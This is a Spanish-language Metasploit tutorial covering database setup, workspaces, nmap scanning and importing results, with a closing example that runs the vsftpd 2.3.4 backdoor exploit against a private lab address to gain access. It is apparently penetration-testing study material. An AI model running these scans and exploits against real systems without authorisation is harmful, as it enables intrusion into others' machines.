# Metasploit

## Configuración Inicial

La primera vez que usamos Metasploit, necesitamos crear la estructura de la base de datos. Para ello, primero debemos iniciar el sistema de gestión de bases de datos, que es PostgreSQL.

### Iniciando el Servicio de PostgreSQL

Iniciamos el servicio:

```shell
service postgresql start
```

Creamos la estructura de la base de datos con el siguiente comando:
```shell
msfdb init
```

Verificamos el estado con el siguiente comando:
```shell
msfconsole -q -x db_status
```

Si todo ha ido bien, deberías ver la siguiente salida:

```shell
[*] Connected to msf.Connection type: postgresql
```

### Gestión de Espacios de Trabajo

Podemos crear espacios de trabajo para organizar las máquinas que estamos auditando:

```shell
# Ayuda sobre espacios de trabajo
workspace -h 

# Crear un espacio de trabajo
workspace -a <nombre>
workspace -a maquina1

# Listar espacios de trabajo
workspace
```

#### Ejemplo práctico:

Supongamos que estamos auditando una red con varias máquinas. Creamos un espacio de trabajo para cada máquina:

```shell
workspace -a servidor_web
workspace -a servidor_bd
workspace -a cliente1
```

Esto nos permitirá mantener los datos organizados y separados por máquina.

## Escaneo con Nmap en Metasploit

### Escaneo Automático

Podemos iniciar un escaneo Nmap directamente desde Metasploit con el siguiente comando:

```shell
db_nmap -sP <ip>
```

Los dispositivos se agregarán automáticamente a la base de datos. Podemos ver los hosts añadidos con el comando `hosts`:

```shell
hosts
```

#### Ejemplo práctico:

Si queremos escanear una red completa, podemos usar:

```shell
db_nmap -sP 192.168.1.0/24
```

Esto añadirá todos los dispositivos detectados en la red 192.168.1.0/24 a la base de datos.

### Escaneo Manual

Primero realizamos el escaneo y lo guardamos en formato XML para importarlo en Metasploit:

```shell
nmap -p- -sS -O 192.168.37.136 --min-rate 9000 -oX nmap_result.xml
```

Desde Metasploit, lo importamos de la siguiente manera:

```shell
msf6 > db_import /home/kali/Desktop/resultado_nmap.xml
```

Podemos verificar los servicios importados con la siguiente opción:
```shell
msf6> services
```

Esto mostrará todos los puertos encontrados en la máquina.

#### Ejemplo práctico:

Si queremos identificar servicios específicos, como servidores web, podemos filtrar los resultados:

```shell
msf6> services -p 80,443
```

Esto mostrará únicamente los servicios que están escuchando en los puertos 80 y 443.

## Ejemplo Adicional: Uso de Exploits

Una vez que hemos identificado un servicio vulnerable, podemos buscar exploits en Metasploit:

```shell
msf6 > search type:exploit name:<nombre_del_servicio>
```

#### Ejemplo práctico:

Si encontramos un servidor FTP vulnerable, podemos buscar un exploit para él:

```shell
msf6 > search type:exploit name:ftp
```

Seleccionamos un exploit y configuramos las opciones necesarias:

```shell
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.37.136
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

Si el exploit tiene éxito, obtendremos acceso a la máquina objetivo.